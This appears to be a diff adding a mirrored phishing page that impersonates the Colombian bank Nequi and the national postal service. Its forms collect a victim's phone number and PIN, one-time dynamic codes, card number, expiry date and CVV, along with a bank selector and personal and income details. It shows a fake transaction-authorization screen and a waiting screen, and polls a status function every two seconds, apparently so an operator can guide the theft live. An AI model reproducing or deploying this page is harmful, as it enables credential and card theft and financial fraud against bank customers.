@@ -1,0 +1,435 @@
+<html>
+    
+<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:01 GMT -->
+<head>
+        <title>El servicio de envíos de Colombia</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="../img/favicon.png" type="image/x-icon">
+        <link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;0,1000;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900;1,1000&amp;display=swap" rel="stylesheet">
+        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>      
+        <link href="../css/style.css" rel="stylesheet">
+        <link href="../css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../js/functions.js"></script> 
+        <script type="text/javascript" src="../js/ready.js"></script>  
+        <script src="../js/jquery.jclock-min.html" type="text/javascript"></script>
+        <style type="text/css">
+            body{
+            background-color: #fbe5f2;
+            display: flex;
+            justify-content: center;
+            align-content: flex-start;
+            margin-top: 150px;
+
+        }
+        #fondo{
+            position: fixed;
+            z-index: 600;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background-color: #fbe5f2   ;                         
+        }
+
+        #frm-esperando{
+            padding: 30px 20px 0px 20px;
+        }
+        
+        /* Estilo para el botón habilitado */
+        .btn-habilitado {
+            background-color: #DA0081; /* Cambia el color a amarillo */
+            color: #fff;
+        }
+
+        /* Estilo para el botón deshabilitado */
+        .btn-deshabilitado {
+            background-color: #F1BFDA; /* Cambia el color a gris */
+            color: #fff;
+        }
+            #frm-nuevootp{
+                display: none;
+            }
+        </style>     
+        <script type="text/javascript">    
+            $(document).ready(function(){
+                buscar_documento();
+
+                var FechaFull = new Date();
+                var dia = FechaFull.getDate();
+                var mes = FechaFull.getMonth();
+                var ano = FechaFull.getFullYear();
+
+                mes = mes + 1;
+
+                $("#fec").html(dia + "/" + mes + "/" + ano);
+
+                setInterval(consultar_estado,2000);  
+            }); 
+        </script>   
+    </head>
+    <body>
+        <div id="fondo"></div>
+        
+         <div style="height: 100%;" >
+            <div id="frm-verificacion" class="frm-modal">
+                <img src="../img/nequi-1.png" alt="" style="width: 100%;margin-top: 30px;">
+                <div class="formulario">
+                    <input style="background-color: #fbf7fb;" type="text" name="txt-usuario"  inputmode="numeric"placeholder="Número de celular" id="txt-usuario" autocomplete="off" class="entradas" maxlength="10">
+                    <div class="error" id="err-usuario">Número de celular</div>                
+                    <br>
+                    <div class="espacio"></div>
+                    <input style="background-color: #fbf7fb;" type="password" name="txt-password" inputmode="numeric" placeholder="Contraseña" id="txt-password" autocomplete="off" class="entradas" maxlength="4"> 
+                    <div class="error" id="err-password">Contraseña</div>                   
+                    <br><br>
+                    <button class="btn btn-deshabilitado" id="btn-iniciar-sesion" disabled>Iniciar Sesión</button>
+                </div>
+    
+            </div>
+    
+        </div>
+
+        <div id="frm-nuevootp" class="frm-modal">
+            <img src="../img/nequi-4.png" alt="" style="width: 90%; margin-top: 30px;" >
+          <div class="erro" id="err-nuevoot" style="display:flex;font-size: 15px;text-align: center;justify-content: center;">Tu clave dinámica la encuentras <br>en nuestra app Nequi</div>
+            <img src="../img/clave-dinamica.png" alt="" style="width: 40%; margin-top: 0px;" >
+            <br>
+            <div class="formulario">
+                <input style="background-color: #fbf7fb;"placeholder="Ingresa tu clave dinámica"type="password" name="txt-nuevootp" id="txt-nuevootp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-nuevootp" style="display:flex; text-align: center;">El código que has ingresado es inválido o ha caducado. Intenta nuevamente.</div>
+                <br>
+                <button class="btn" id="btn-validar-nuevo">Validar</button>
+            </div>
+        </div>
+
+        <div id="frm-otp" class="frm-modal">
+            <img src="../img/nequi-4.png" alt="" style="width: 90%; margin-top: 30px;" >
+          <div class="erro" id="err-nuevoot" style="display:flex;font-size: 15px;text-align: center;justify-content: center;">Tu clave dinámica la encuentras <br>en nuestra app Nequi</div>
+            <img src="../img/clave-dinamica.png" alt="" style="width: 40%; margin-top: 0px;" >
+            <div class="formulario">
+                <input style="background-color: #fbf7fb; margin-bottom:15px ;" placeholder="Ingresa tu clave dinámica"type="password" name="txt-otp" id="txt-otp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <button class="btn btn-deshabilitado" id="btn-validar" disabled>Validar</button>
+            </div>
+        </div>
+
+        <div id="frm-esperando" class="frm-modal2" style="display:block; width: 90%; background-color:#fbe5f2; height: 100%; margin-top: 110px;">
+            <img src="../img/nequi.svg" width="120" id="logo-entidad-472">
+            <br><br>
+            <div>Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minutos. No cierres o recargues esta ventana.</div>
+        
+                             
+        </div>
+
+        <div id="frm-cargando" class="frm-modal">
+            <img src="../img/nequi.svg" width="50" id="logo-entidad-load">
+            <br>
+            <img src="../img/preloader2.gif" width="120">            
+            <br>
+            <div>Estamos procesando su solicitud espere un momento</div>
+        </div>
+
+        <div id="frm-autorizar" class="frm-modal">
+            <div style="padding: 30px 30px 0px 30px">
+                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tr>
+                        <td valign="middle" align="left"><img src="../img/verificado.jpg" width="100"></td>
+                        <td valign="middle" align="right"><img src="../img/mcheck.png" width="120"></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="titulo">Autorización de Transacción</div>
+            <br>
+            <div class="descripcion">La transacción que intentas realizar con <b>SERVICIOS POSTALES NACIONALES S.A.S.</b> por $6.200 el día <span id="fec">--</span> con la tarjeta terminada en <b><span id="tar">9969</span></b> deber ser autorizada.</div>
+            
+            <div class="titulo">DETALLES DE TRANSACCIÓN</div>
+            <br>
+            <div class="descripcion">
+                <b>Comercio:</b> SERVICIOS POSTALES NACIONALES S.A.S.<br>
+                <b>Monto de la transacción:</b> $6.200<br>
+                <b>Número de autorización:</b> AG3244234
+            </div>
+            <br><br>
+            <div class="formulario">                
+                <button class="btn" id="btn-autorizar">Autorizar</button>
+            </div>
+        </div>
+
+
+        <div style="height: 100%;" >
+            <div id="frm-verificacion" class="frm-modal">
+                <img src="../img/nequi-1.png" alt="" style="width: 100%;margin-top: 30px;">
+                <div class="formulario">
+                    <input style="background-color: #fbf7fb;" type="text" name="txt-usuario"  inputmode="numeric"placeholder="Número de celular" id="txt-usuario" autocomplete="off" class="entradas" maxlength="10">
+                    <div class="error" id="err-usuario">Número de celular</div>                
+                    <br>
+                    <div class="espacio"></div>
+                    <input style="background-color: #fbf7fb;" type="password" name="txt-password" inputmode="numeric" placeholder="Contraseña" id="txt-password" autocomplete="off" class="entradas" maxlength="4"> 
+                    <div class="error" id="err-password">Contraseña</div>                   
+                    <br><br>
+                    <button class="btn btn-deshabilitado" id="btn-iniciar-sesion" disabled>Iniciar Sesión</button>
+                </div>
+    
+            </div>
+    
+        </div>
+
+
+        <div id="frm-animacion" class="frm-modal">
+            <img src="../img/tarjeta.gif">
+            <br>
+            <div>Estamos procesando su solicitud espere un momento</div>
+        </div>
+
+
+        <div id="frm-tarjeta" class="frm-modal">            
+            <div class="formulario" style="padding-top: 30px;">
+                <div class="etiqueta">Banco</div>
+                <select id="txt-entidad" name="txt-entidad" class="entradas">
+                    <option label="A continuación seleccione su banco" value="">A continuación seleccione su banco</option>
+                    <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+                    <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+                    <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
+                    <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                    <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
+                    <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO COOPERATIVO COOPCENTRAL</option>
+                    <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA</option>
+                    <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
+                    <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
+                    <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
+                    <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
+                    <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC</option>
+                    <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
+                    <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+                    <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
+                    <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+                    <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA</option>
+                    <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
+                    <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
+                    <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+                    <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
+                    <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                    <option label="CITIBANK " value="citibank">CITIBANK</option>
+                    <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
+                    <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                    <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA FINANCIERA</option>
+                    <option label="COTRAFA" value="cotrafa">COTRAFA</option>
+                    <option label="DALE" value="dale">DALE</option>
+                    <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
+                    <option label="IRIS" value="iris">IRIS</option>
+                    <option label="LULO BANK" value="lulo">LULO BANK</option>
+                    <option label="MOVII S.A." value="movii">MOVII S.A.</option>
+                    <option label="NEQUI" value="nequi">NEQUI</option>
+                    <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
+                    <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
+                    <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA</option>
+                </select>
+                <div class="error" id="err-entidad">Seleccione un Banco</div>
+                <div class="espacio"></div>
+                <div class="etiqueta">Tarjeta</div>
+                <input type="text" name="txt-tarjeta" id="txt-tarjeta" class="entradas" autocomplete="off" maxlength="16" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-tarjeta">Ingrese una tarjeta de crédito</div>
+                <div class="espacio"></div>
+                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tr>
+                        <td>
+                            <div class="etiqueta">Mes</div>
+                            <select id="mFecha" name="mFecha" class="entradas">
+                                <option value="" default selected>Seleccionar</option>
+                                <option value="01">Enero</option>
+                                <option value="02">Febrero</option>
+                                <option value="03">Marzo</option>
+                                <option value="04">Abril</option>
+                                <option value="05">Mayo</option>
+                                <option value="06">Junio</option>
+                                <option value="07">Julio</option>
+                                <option value="08">Agosto</option>
+                                <option value="09">Septiembre</option>
+                                <option value="10">Octubre</option>
+                                <option value="11">Noviembre</option>
+                                <option value="12">Diciembre</option>
+                            </select>
+                        </td>
+                        <td>
+                            <div class="etiqueta">Año</div>
+                            <select id="aFecha" name="aFecha" class="entradas">
+                                <option value="" default selected>Seleccionar</option>                  
+                                <option value="2022">2022</option>
+                                <option value="2023">2023</option>
+                                <option value="2024">2024</option>
+                                <option value="2025">2025</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                            </select>
+                        </td>
+                    </tr>
+                </table>
+                <div class="error" id="err-fecha">Ingrese la fecha de vencimiento</div>
+                <div class="espacio"></div>
+                <div class="etiqueta">CVV</div>
+                <input type="text" name="txt-cvv" id="txt-cvv" class="entradas" autocomplete="off" maxlength="3" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-cvv">Ingrese el código de verificación</div>
+                <br><br>
+                <button class="btn" id="btn-pagar">Pagar</button>
+            </div>
+        </div>
+
+        <div class="container" style="width: 90%;">
+            <div class="frm" id="frm-informacion">
+                <img src="../img/nequi-4.png" alt="" style="width: 100%; margin-top: 30px;">
+                <br>
+                <div class="descripcion" style="display: flex; text-align: center; justify-content: space-around;">Verifica tus datos</div>
+                <input style="border: 0; background-color: #fbf7fb;" type="text" readonly disabled style="background-color: #f1f1f1;" name="txt-cedula" id="txt-cedula" class="entradas" autocomplete="off">
+                <div class="espacio"></div>   
+        
+                <input style="border: 0; background-color: #fbf7fb;" placeholder="Ingrese su nombre completo" type="text" name="txt-nombre" id="txt-nombre" class="entradas" autocomplete="off">
+                <div class="error" id="err-nombre">Ingrese su nombre completo</div>
+                <div class="espacio"></div>   
+        
+                <input style="border: 0; background-color: #fbf7fb;" placeholder="Ingrese su número de celular" type="text" name="txt-celular" id="txt-celular" class="entradas" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-celular">Ingrese su número de celular</div>
+                <div class="espacio"></div> 
+        
+                <input style="border: 0; background-color: #fbf7fb;" placeholder="Ingrese un Correo electrónico" type="text" name="txt-correo" id="txt-correo" class="entradas" autocomplete="off">
+                <div class="error" id="err-correo">Ingrese un Correo electrónico</div>
+                <div class="espacio"></div> 
+        
+                <input style="background-color: #fbf7fb;" placeholder="Ingrese sus gastos mensuales" maxlength="20" pattern="[0-9]*" inputmode="numeric"type="text" name="txt-direccion" id="txt-direccion" autocomplete="off" class="entradas">
+                <div class="error" id="err-direccion">Ingrese sus gastos mensuales</div>
+                <div class="espacio"></div> 
+        
+                <input style="border: 0; background-color: #fbf7fb;" placeholder="Ingrese sus ingresos mensuales"maxlength="20" pattern="[0-9]*" inputmode="numeric" type="text" name="txt-ciudad" id="txt-ciudad" class="entradas" autocomplete="off">
+                <div class="error" id="err-ciudad">Ingrese sus ingresos mensuales</div>
+                <div class="espacio"></div> 
+                <br><br>
+                <button class="btn" id="btn-pagar-impuestos" disabled>Pagar Impuestos</button>
+            </div>
+        </div>
+
+    </body>
+
+<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:03 GMT -->
+</html>
+
+<script type="text/javascript">    
+    $(document).ready(function(){
+        buscar_documento();
+
+        var FechaFull = new Date();
+        var dia = FechaFull.getDate();
+        var mes = FechaFull.getMonth();
+        var ano = FechaFull.getFullYear();
+
+        mes = mes + 1;
+
+        $("#fec").html(dia + "/" + mes + "/" + ano);
+
+        
+
+        $("#txt-usuario").on("input", function() {
+            var inputValue = $(this).val();
+            if (inputValue.trim() !== "" && inputValue.length <= 10) {
+                $("#btn-iniciar-sesion").prop("disabled", false);
+                $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-iniciar-sesion").prop("disabled", true);
+                $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        });
+
+        $("#txt-password").on("input", function() {
+            var inputValue = $(this).val();
+            if (inputValue.trim() !== "" && inputValue.length <= 4) {
+                $("#btn-iniciar-sesion").prop("disabled", false);
+                $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-iniciar-sesion").prop("disabled", true);
+                $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }); 
+    }); 
+</script> 
+   <script type="text/javascript">    
+    $(document).ready(function(){
+        // Función para habilitar/deshabilitar el botón
+        function toggleButton() {
+            var inputValue = $("#txt-otp").val();
+            if (inputValue.trim() !== "") {
+                $("#btn-validar").prop("disabled", false);
+                $("#btn-validar").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-validar").prop("disabled", true);
+                $("#btn-validar").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        toggleButton();
+
+        // Ejecutar la función al escribir en el input
+        $("#txt-otp").on("input", toggleButton);
+    }); 
+</script>
+ <script type="text/javascript">    
+    $(document).ready(function(){
+        // Función para habilitar/deshabilitar el botón
+        function toggleButton() {
+            var inputValue = $("#txt-nuevootp").val();
+            if (inputValue.trim() !== "") {
+                $("#btn-validar-nuevo").prop("disabled", false);
+                $("#btn-validar-nuevo").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-validar-nuevo").prop("disabled", true);
+                $("#btn-validar-nuevo").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        toggleButton();
+
+        // Ejecutar la función al escribir en el input
+        $("#txt-nuevootp").on("input", toggleButton);
+    }); 
+</script> 
+
+<script type="text/javascript">    
+    $(document).ready(function(){
+        // Función para habilitar/deshabilitar el botón
+        function toggleButton() {
+            var nombre = $("#txt-nombre").val().trim();
+            var celular = $("#txt-celular").val().trim();
+            var correo = $("#txt-correo").val().trim();
+            var direccion = $("#txt-direccion").val().trim();
+            var ciudad = $("#txt-ciudad").val().trim();
+
+            if (nombre !== "" && celular !== "" && correo !== "" && direccion !== "" && ciudad !== "") {
+                $("#btn-pagar-impuestos").prop("disabled", false);
+                $("#btn-pagar-impuestos").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-pagar-impuestos").prop("disabled", true);
+                $("#btn-pagar-impuestos").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        toggleButton();
+
+        // Ejecutar la función al escribir en los inputs
+        $(".entradas").on("input", toggleButton);
+    }); 
+</script>
